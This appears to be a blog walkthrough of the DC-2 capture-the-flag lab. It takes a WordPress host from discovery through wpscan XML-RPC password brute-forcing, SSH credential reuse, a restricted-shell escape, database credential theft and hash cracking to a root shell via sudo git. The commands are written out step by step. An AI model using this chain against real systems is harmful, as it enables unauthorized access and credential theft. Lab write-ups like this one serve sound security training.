# DC-2 of the DC Series


With DC-1 out of the way, let's move onto **DC-2** of the DC Series!

---
---
## DC-2 Details
<span style="color:cyan">
<details closed>
<summary> Click here to see DC-2's quick overview.
</summary>
<br>
Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

As with the original DC-1, it's designed with beginners in mind.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Just like with DC-1, there are five flags including the final flag.

And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.

In short, the only flag that really counts, is the final flag.

For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.

I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.
</details>
</span>

Further details can be found at [https://www.five86.com/dc-2.html](https://www.five86.com/dc-2.html).

  
---
---

## Finding DC-2's IP

Once you've imported, configured, and started the DC-2 VM, let's acquire its IP by running  
`sudo netdiscover -r *IP*/*CIDR*` from our attack box's terminal. `-r` specifies the IP range by IP/CIDR notation.  
(There's always another way to reach a similar outcome, so feel free to use your own techniques/tools to acquire DC-2's IP address.)

> If you see two asterisks surrounding some characters, like `*IP*`, removal of the asterisks and inserting the appropriate characters is needed.  
> In this case, `*IP*` and `*CIDR*` need replaced by the IP address(e.g. 192.168.56.0) and subnet mask shorthand via CIDR(/24), in which DC-2 exists, respectively.  

Depending on my attack system's interface/routing configuration, I may have to run the `netdiscover` command with the `-i` option. `-i` specifies which interface I want the ARP requests to be sent through. As I'm running multiple NICs, a VPN, and virtualbox, on this particular attack box, I have to run the following command to grab DC-2's IP:  
`sudo netdiscover -i vboxnet0 -r 192.168.56.0/24`

> PS You'll need to `CTRL+C` to exit `netdiscover`.  

![netdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2](/images/DC-Series/DC-2/netdiscover.png "netdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2")

Now that we have DC-2's IP address, let's move onto setting up environment variables through the attack box's terminal.

---
---

## Exporting Environment Variables

To speed up a few future commands, let's export a few environment variables to include the IP address we obtained earlier.
  1. `export IP="*IP*"` --> This will create a variable, named $IP, containing DC-2's IP address.
    - e.g. `export IP="192.168.56.111"`
  2. `export URLdir="http://*IP*/FUZZ/"` --> Variable for fuzzing directories. We append a forward slash `/` to specify directories.
    - e.g. `export URLdir="http://192.168.56.111/FUZZ/"`
  3. `export URLfile="http://*IP*/FUZZ"` --> A var useful for fuzzing files.
    - e.g. `export URLfile="http://192.168.56.111/FUZZ"`
  4. Let's make sure we've exported the variables correctly by running `echo $IP; echo $URLdir; echo $URLfile`

![echo our $IP, $URLdir, $URLfile vars](/images/DC-Series//DC-2/echo-exports.png "echo our $IP, $URLdir, $URLfile vars") 

> PS If you ever export variables and then create a second shell, the ***second shell will only contain the previously exported variables if it's a child shell of the first.***  

---
---

## Scanning and Enumeration

At this point, we're set to start scanning and enumerating DC-2! Since this is a blog post, I'm going to keep things somewhat short but feel free to dig into anything/everything you can. If you find another path to go down, do it! It can help you learn what to look for and how to prioritize those initial findings.

> This phase of a pentesting process can and should consume the largest amount of time, as you're wanting to find ***everything*** you can. Not only will this help if you were to get stuck but, if this were a real world pentest, you'd want to provide the customer an accurate report by being thorough!  

---

### nmap scan
Anyways, let's get to it by starting with a nmap scan against DC-2's IP.
  1. `nmap $IP -T4 -p- -sC -sV --open`
      - `$IP` --> is the previously exported IP address of DC-2.
      - `-T4` --> T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at [Nmap's Timing Templates](https://nmap.org/book/performance-timing-templates.html) webpage.
      - `-p-` --> tells nmap to scan ALL 65,535 TCP ports.
      - `-sC` --> specifies nmap to run default scripts. `-A` includes this.
      - `-sV` --> enables version detection. `-A` includes this.
      - `--open` --> only shows ports that are "open". Safe against a purposely vulnerable box but not suggested for a real pentest as it may hide a reportable finding.

![nmap results - Linux box w/ http on 80, ssh on 7744](/images/DC-Series//DC-2/nmap-results.png "nmap results - Linux box w/ http on 80, ssh on 7744")
 
---

#### Analyzing nmap scan
- Debian Linux running services http(port 80) and ssh(port 7744).
  - http(80) may only be accessible via hostname and not IP. Needs tested.
    - Many reasons to this but maybe it's hosting more than one webapp? Think VHOST.
  - ssh(7744) running on non-default port but that doesn't particularly mean anything.

---

### Manual inspection of http(80)
Let's open a browser and visit the target IP(DC-2) and see what it shows.

It's redirecting us to "http://dc-2/" domain? If you look at the nmap results, you'll see nmap already reported this to us. "Did not follow redirect to http://dc-2/"

I'd suspect that port 80 is configured with a name-based virtual host, meaning that one IP address could host multiple sites served by the hostname only.

---

### Adding DC-2 to /etc/hosts
In order to tell our attack box that we want `$IP` to resolve to DC-2, we simply add this information to the /etc/hosts file on the attackbox.
> Once we're finished with the DC-2 box, we'll simply revert this change.
1. `sudo nano /etc/hosts`
2. A few spaces below the existing content, let's add `*IP* dc-2`.  
   NOTE! Spacing between the IP address and hostname is (1) *TAB*! Not spaces via SPACEBAR.
3. Now we do keyboard combos of `CTRL+O` then `ENTER`(to save it) followed by `CTRL+X`(to exit)
4. Now confirm the changes by running `cat /etc/hosts`
End result..

![added dc-2 into /etc/hosts](/images/DC-Series/DC-2/etc-host.png "added dc-2 into /etc/hosts")

---

### Rerun nmap after /etc/hosts update
Look how our redirect is working and nmap is able to grab the proper banners!
![nmap results after /etc/hosts update - proper banners](/images/DC-Series/DC-2/second-nmap.png "nmap results after /etc/hosts update - proper banners")

---

### Reinspecting http(80)
Let's visit http://dc-2 in our browser.. Access to the webapp, finally! Looks like WordPress.
![Wordpress CMS found](/images/DC-Series/DC-2/manual-inspection-http.png "Wordpress CMS found")

> CMS stands for Content Management System. It's an app that allows multiple contributors to create, manage, and modify content on a website. Wordpress(WP) is a common CMS in the wild.  

---

### Updating our notes
Let's notate what we've found and what possible tools/techniques to try. As we move forward, let's continue to update our notes.
> **Box Name** : DC-2 (DC Series)  
> **OS** : Debian (Linux)  
> **IP** : 192.168.56.111  
  
> **80** : Apache httpd 2.4.10  
> *Added "192.168.56.111 dc-2" to attackbox /etc/hosts to allow access of WP CMS*  
> **80** : Wordpress 4.7.10  
> What to try: view source, file/directory busting/fuzzing, wpscan  

> **7744** : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)  
> What to try: searchsploit for vulns  
>
> ***When finished, remove IP dc-2 from /etc/hosts file***  

---

### Fuzzing http/80
Now that we can access the webapp as intended, let's move onto fuzzing!  
  
Fuzzing is a technique used to inject something into an app and filter the responses. Since we're dealing with a webapp, we'll be using a tool called wfuzz to brute-force the webapp's file and directory paths.

`wfuzz` will simply brute-force the webapp's file/directory parameter(or wherever we place the word`FUZZ`), against a specified wordlist. For each word sent, it'll record the webapp's response. We then filter out the responses we don't need, like 404's, and a list is created! This can help us find hidden login pages, accidentally exposed files, etc. and save us lots time!  

There's various tools that can accomplish this task e.g. dirbuster, ffuf, wfuzz, etc but today I'll stick with wfuzz. I'll make sure to use different tools on DC-3, so we don't become repetitive and boring.  
Promise! :wink:
>I suggest you try any trusted tools and find your favorites.  
>Go check out the resources page as it contains a large list of tools.  

---

#### Fuzzing $URLfile
Let's start with fuzzing files by running the following command.
- `wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile`
  - `-c` --> provides a color output for the webapp's response column.
  - `-z file,/*wordlist*` --> specifies payload type and points to file wordlist.
  - `--hc 403,404` --> tells `wfuzz` not to display any 403 or 404 responses.
  - `$URLfile` --> is the exported variable with no appended backslash, meaning wfuzz will fuzz for files.
- Let's manually visit each recorded response, in our browser, to see what it presents! ***ignore the last 404***  

{{< admonition type=tip title="Wordlist Tip" open=true >}}  
If you lack the SecList wordlists(already included in Kali's repo), you can find it at [Daniel Miessler's Github Page](https://github.com/danielmiessler/SecLists). It's a collection of various lists that can be used for various assessments! Very useful!
SecLists works great for CTFs but for real world pentesting, you'll may be using custom or something found in my resources posts.
{{< /admonition >}}

![wfuzz results - files](/images/DC-Series/DC-2/wfuzz-files.png "wfuzz results - files")

---

#### files worth notating
1. **http://dc-2/xmlrpc.php** --> XML-RPC API? We can use this to brute-force logins without restrictions. The `wpscan` tool can abuse this. We'll use wpscan later!
2. **http://dc-2/wp-login.php** --> wp login page
    - Potential login abuse techniques? Think email/user enumeration or brute-forcing.
3. **http://dc-2/readme.html** --> info disclosure. versioning? PHP, MySQL, mod_rewrite apache module? Injections? Targeted exploits?
4. **http://dc-2/wp-links-opml.php** --> info disclosure. WP 4.7.10 confirmed

---

#### Fuzzing $URLdir
Let's now fuzz against directories. We'll simply change the exported variable and wordlist options in our previous command.

- `wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 $URLdir`
  - `-z file,/*wordlist*` --> changed to a directories wordlist.
  - `$URLdir` --> exported variable that includes appended backslash, so wfuzz searches for directories.
- Let's manually visit each recorded response, in our browser, to see what it presents! ***ignore the last three responses***

![wfuzz results - directories](/images/DC-Series/DC-2/wfuzz-dir.png "wfuzz results - directories")

---

#### directories worth notating
1. **http://dc-2/wp-includes/** --> contains core WP file/folders
   - http://dc-2/wp-includes/css/jquery-ui-dialog.min.css shows jQuery 1.11.4? Version may be wrong when compared to whatweb.
2. **http://dc-2/wp-admin/** --> contains file/folders to the WP dashboard panel but redirects to /wp-login.php
3. **http://dc-2/wp-content/** --> contains plugins/themes for WP

---

### Confirm WebTech with Wappalyzer

Regarding the potential WebTech findings in the /readme.html file, let's confirm those by visiting the site with a browser extension called [Wappalyzer](https://www.wappalyzer.com/). To start using, simply:
- Install it through the browser's extension manager
- Visit http://dc-2 with our browser and see which tech stack it's using.

![Wappalyzer Results](/images/DC-Series/DC-2/wappalyzer.png "Wappalyzer Results")

- We're able to confirm:
  - Wordpress 4.7.10 --> Confirmed with nmap after /etc/hosts update
  - Apache HTTP Server 2.4.10 --> Confirmed with nmap
  - PHP --> Found potential use through /readme.html. Version 5.2.4?
  - Debian --> Found through apache 404 error. Info Disclosure
  - MySQL --> Found in /readme.html. Version 5.0?
  - jQuery 1.12.4 and jQuery Migrate 1.4.1. Versioning is off to our 1.11.4 finding. --> Found in /wp-includes directory. Version 1.11.4?
  - Twenty Seventeen Theme --> Found with wpscan. Version 1.2?

---

### Findings & Updating Notes
We have some additional info to add into our notes. Let's also create a to-do section.

> PS If you attempt admin:password, at the /wp-login page, you'll see that username enumeration is possible! If the XML-RPC API wasn't enabled, we could possibly attack this login page.  

![/wp-login.php user enum possible](/images/DC-Series/DC-2/username-enumeration.png "/wp-login.php user enum possible")

***TO-DO LIST***  
Things to check:  
- Use wpscan to:
  - enumerate usernames
  - brute-force WP login by abusing the XML-RPC API? Maybe create a custom wordlist? Hint from Flag 1 referencing a tool called `cewl`.
- Once we have shell, look for MySQL database as it may include sensitive information.

***NOTES***  
> **Box Name** : DC-2 (DC Series)  
> **OS** : Debian (Linux)  
> **IP** : 192.168.56.111  
> **USERS** :  
> WP --> admin   , 
>   

> **80** : Apache httpd 2.4.10  
>*Added "192.168.56.111 dc-2" to attackbox /etc/hosts to allow access of WP CMS*  
>mod_rewrite module exploits?  
>**80** : Wordpress 4.7.10  
>Username enumeration is possible at /wp-login.php  
>/xmlrpc.php API enabled, so wpscan can be used to brute-force  
>/wp-includes/ , /wp-admin/ , /wp-content/ directories found  
> **80** : PHP 5.2.4???  
>Injection attacks?  
> **80** : MySQL 5.0???  
> Injection attacks?  
>  **80** : jQuery 1.12.4 & jQuery Migrate 1.4.1???  
> XSS attacks?  
>  **80** : Twenty Seventeen Theme 1.2???  
> Potential exploits?  


> **7744** : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)  
> searchsploit for vulns  
> attempt logins via brute-force or once we enumerate potential usernames/passwords  
>  
> ***When finished, remove IP dc-2 from /etc/hosts file***  
>  

---

### wpscan - Enumerating Usernames

`wpscan` is a wordpress security scanner that allows us to assess wordpress apps.  
Our goal is to use `wpscan` to enumerate usernames, `cewl` to create a custom password list, and finally use `wpscan` to brute-force logins via the XML-RPC API that's enabled, as it doesn't limit login attempts.
- To enumerate users with wpscan, simple run `wpscan --url http://dc-2`. Looks like we have three WP users, including the admin user we've already confirmed via /wp-login.php. Let's add these users to our notes.
  - **admin; jerry; tom**

![wpscan - user enumeration](/images/DC-Series/DC-2/wp-username-enum.png "wpscan - user enumeration")

---

### CeWL - Creating word lists

CeWL, Custom Word List Generator, spiders the specified URL and creates a list per the flags specified.

After a little googling(google is your friend!), it looks like wordpress uses a 10 character minimum requirement. So, we'll be sure to use the flag `-m` with a argument of `10` to specify this minimal length requirement.

If you haven't already, create a folder to store any related dc-2 files into, including the next `cewl` file we create.

Now let's run the `cewl` tool!
`cewl http://dc-2:80/ -m 10 -w $PWD/dc-2-cewl.txt`
  - `-m 10` --> specifies the minimum length of 10 characters
  - `-w $PWD/dc-2-cewl.txt` --> tells cewl to export file name "dc-2-cewl.txt" into the current working directory(var of `$PWD`)
  - `cat dc-2-cewl.txt` and you'll see these results.

![cewl results](/images/DC-Series/DC-2/cewl-results.png "cewl results")

Let's also create a list for usernames called dc-2-users.txt, so we can use it along side the password list, dc-2-cewl.txt, we just created.  
`echo -e "admin\njerry\ntom" > dc-2-users.txt`
- `-e`--> echo recognizes \n(new line), and others additional syntax.
- `>` --> overwrites data in the "dc-2-users.txt" file

Now that we have some usernames and a custom password wordlist, let's update our notes and then exploit the XML-RPC API :smiley:

---

### Updating notes before exploiting

***TO-DO LIST***  
Things to check:  
- Use wpscan to:
  - Brute-force WP XML-RPC with wpscan, dc-2-users.txt, and dc-2-cewl.txt
- After we get into wordpress, look for injection points, vulnerable plugins, etc
- Once we have shell, look for MySQL database as it may include sensitive information.

***NOTES***  
> **Box Name** : DC-2 (DC Series)  
> **OS** : Debian (Linux)  
> **IP** : 192.168.56.111  
> **USERS** : WP(admin;jerry;tom)  
>   
> **80** : Apache httpd 2.4.10  
>*Added "192.168.56.111 dc-2" to attackbox /etc/hosts to allow access of WP CMS*  
>mod_rewrite module exploits?  
>**80** : Wordpress 4.7.10  
>Username enumeration is possible at /wp-login.php  
>/xmlrpc.php API enabled, so wpscan will be used to brute-force  
>/wp-includes/ , /wp-admin/ , /wp-content/ directories found  
> **80** : PHP 5.2.4???  
>Injection attacks?  
> **80** : MySQL 5.0???  
> Injection attacks?  
>  **80** : jQuery 1.12.4 & jQuery Migrate 1.4.1???  
> XSS attacks?  
>  **80** : Twenty Seventeen Theme 1.2???  
> Potential exploits?  


> **7744** : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)  
> searchsploit for vulns  
> attempt logins via brute-force or once we enumerate potential usernames/passwords  
>  
> ***When finished, remove IP dc-2 from /etc/hosts file***  
>  

---
---

## Exploiting

### Abusing WP XML-RPC

XML-RPC is an API that allows another application to publish, edit, delete posts, upload new files, get a list of commands, edit comments all through a POST request. The reason this API is nice for attacks is there's no limits or throttling to the amount of requests we send, plus it allows access to many different WP features.

Since we're going to be brute-forcing the login creds of a wordpress site, wpscan will first check and, if present, use this XML-RPC API as the attack vector. If it is absent, wpscan will shift to using the wp-login.php login fields.

---

### Validating WP Creds
Let's get to it and run the attack against XML-RPC  
`wpscan --url http://dc-2/ --disable-tls-checks -U dc-2-users.txt -P dc-2-cewl.txt`
- `--url` --> specifies the URL to attack which is DC-2's WP site
- `--disable-tls-checks` --> disables TLS checks for HTTPs as we're on HTTP
- `-U` --> location of the username list to be used
- `-P` --> location of the password list to be used

![wpscan - verified two valid combinations](/images/DC-Series/DC-2/wpscan-brute-force-results.png "wpscan - verified two valid combinations")

We have two valid credentials for WP;
  - jerry:adipiscing
  - tom:parturient

After logging into both accounts, it looks like they're limited accounts. I was unable to upload *.php files through the media upload form. The plugins and themes pages are also absent, meaning we lack access to abusing them. So, without digging into this further, I think we're meant to go about this by other means.

So, let's try using the credentials, we validated against wordpress, against the SSH service on port 7744! Maybe we'll get lucky and get ssh access into the debian server(dc-2).

---

### Credential reuse on SSH/7744

Let's try logging in as jerry:
  - `ssh jerry@dc-2 -p 7744`
    - answer `yes`
  - try `adipiscing` --> Permission denied, please try again.
  - try `parturient` --> Permission denied, please try again.
  - `CTRL+C` to cancel our attempts as jerry

Try again but with username "tom":
  - `ssh tom@dc-2 -p 7744`
  - try `parturient`

**We're in!!!**  

![tom@dc-2 -p 7744 successful!](/images/DC-Series/DC-2/tom-ssh-login-successful.png "tom@dc-2 -p 7744 successful!")

---

### Escaping a Restricted Shell
We've gained shell but it's restricted.
By running `ls $PATH`, we'll see that we are limited to four binaries:  
less, ls, scp, **vi**  
If you run any other command, you'll see the `-rbash` reference meaning "restricted bash".

![rbash - restricted bash](/images/DC-Series/DC-2/ls-path.png "rbash - restricted bash")

So first thing is first, we need to escape this restricted shell that user "tom" is restricted to.
We can use `vi` to escape the restricted shell.  
In our SSH terminal:
  - `vi`
  - type `:set shell=/bin/bash` then enter
  - type `:shell` then enter

This will escape the restricted shell and we can confirm by running `cd /`.

Once we've gained shell, it's nice to establish a proper and stable shell with tty. As we're connected through SHH, we won't need to spawn a shell through python but setting up PATH variables, etc will make our life easier.
>Anything struck-through represents that the command isn't needed as we're using SSH to establish a stable shell.

  - <s>`python -c 'import pty; pty.spawn("/bin/bash")'` --> spawn an interactive shell via python </s>  
  - `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp` --> setting additional PATH variables  
  - `export TERM=xterm-256color` --> provides us some color in our output  
  - `alias ll='ls -lsaht --color=auto'` --> sets an alias `ll` that runs `ls -lsaht --color=auto`  
  - <s>Press Ctrl + Z to make it a background process </s>  
  - <s>`stty raw -echo;fg;reset`</s>  
  - <s>`stty columns 200 rows 200`</s>  

We should now have a unrestricted, fully interactive tty shell, with a `ll` command that runs `ls -lsaht --color=auto` BUT we're still restricted in the form of system permissions. Hence, we're moving onto privesc!

---
---

## Privilege Escalation

### Enumerating user tom
Let's run through some simple enumeration of the current user, tom, and see if we can find anything to steal or exploit!
- `sudo -l` --> requests for a password and no password, we know, works.
- `find / -perm -u=s -type f 2>/dev/null` --> as we lack `sudo`, none of the SUID or GUID binaries allow for privesc abuse.
- `mysql` access is denied for tom. Same issue with sudo. No working password. (It's forcing us to follow a path...)
- `cat ~/.bash_history` --> nothing interesting in bash history.
&nbsp;
&nbsp;

Let's not forget that we may have access to the WP CMS webroot! Maybe we can steal sensitive information within the database?
- `cd /var/www/html` --> Looks like we now have access to the WP files!  
After digging around in the `html` folder, I found that the `wp-config.php` contains MySQL creds!  
***wpadmin:4uTiLL***

![wpadmin:4uTiLL creds in wp-config.php](/images/DC-Series/DC-2/MySQL-creds-wp-config.png "wpadmin:4uTiLL creds in wp-config.php")

> Future me reporting in...  
> To root this box, we're not needing to gather this SQL info nor do we need to crack hashes. We could skip this section and move onto [Abusing jerry's sudo privs with git](#abusing-jerrys-sudo-privs-with-git) but what's the fun in that!

---

### Hash algorithms w/ hash-identifier
We have three hashes to crack.
1. admin:**$P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY.**
2. tom:**$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.**
3. jerry:**$P$BRCcbpudGlBukTwA7kJsb.rafAL4il.**

To crack them, we'll be using a tool called `hashcat`, but first, we need to determine which hash algorithm was used. SHA1, MD5, etc?  
`hash-identifier` is the perfect tool for this.  
Open up a new terminal and leave our current SSH connection alone, as we still need it!
- `hash-identifier` --> this will execute and open the program's CLI. We will simply copy/paste one of the hashes into the command-line and hit the 'enter' key.
- `hash-identifier` responds with `MD5(wordpress)`
- Hit `CTRL+C`, to exit, and let's now get into `hashcat`

We now know we're dealing with a **MD5(WordPress)** hash algorithm.

---

### Cracking hashes with hashcat
`hashcat` is a "password recovery" tool that utilizes your CPU and, if properly configured, your GPU to crack hashes. In this example, we'll be using the CPU.
*Technique becomes very important when cracking hashes, as it may differentiate between minutes vs days when cracking a hash*

We know the hashes were made using the "Wordpress(MD5)" algorithm, so we need to make sure we tell hashcat this. Let's start by looking up which argument we should provide to the flag `-m`.
- `m` is the flag that we use to specify which algorithm we're attacking.
There's many lists our there but here's a quick reference. [Generic Hash Types](https://hashcat.net/wiki/doku.php?id=example_hashes)  
Simply `CTRL+F` for "WordPress" and you'll land on a argument value of `400`.  
Now we know which argument value to provide the flag `-m`.

> PS - Export the three found hashes, that were in the MySQL database, into a text file as we'll need to specify that file in our `hashcat` command

Let's attack the hashes with our previously created `cewl` list called `dc-2-cewl.txt`.
  - `hashcat -m 400 -a 0 *location/hashes-to-crack.txt* dc-2-cewl.txt`
    - `m` --> specifies the algorithm the hashes were created with.
    - `a 0` --> tell hashcat to do a straight attack, meaning it'll run straight through each word without altering it's structure/order of characters.

We're able to crack the two previously found passwords but not the admin password...
***$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.:parturient***
***$P$BRCcbpudGlBukTwA7kJsb.rafAL4il.:adipiscing***  

![two hashes cracked, admin not cracked](/images/DC-Series/DC-2/two-hashes-cracked.png "two hashes cracked, admin not cracked")

> Since we have the hashes and know the algorithm, we could crack the admin password at a later time but I'll pass. We've stolen the sensitive data from the MySQL database and ran through some cewl / hashcat examples. The concepts are what matter here. :smiley:

---

### Abusing jerry's sudo privs with git

Since it seems the box wants us to go for jerry now(tom & jerry cartoon...), let's login as jerry by:
- `su jerry` --> enter the WP password we found for jerry --> `adipiscing`  

**We're in as jerry!**
- `sudo -l` --> looks like jerry has root privs to the binary `git`  
![jerry - sudo -l shows git as root!](/images/DC-Series/DC-2/jerry-sudo-l.png "jerry - sudo -l shows git as root!")  

What do you know... `git` can be abused(confirmed via [GTFObins](https://gtfobins.github.io/gtfobins/git/#sudo)), if the user has sudo perms, to gain privesc!
Let's gain root!

`sudo git -p help config` --> enter  
`!/bin/sh` --> enter  

---
---

## ROOTED!
![ROOTED!](/images/DC-Series//DC-2/DC-2-ROOTED.png "ROOTED!")


---

> Author: revsh3ll  
> URL: https://PivotTheNet.GitHub.io/dc-2/  

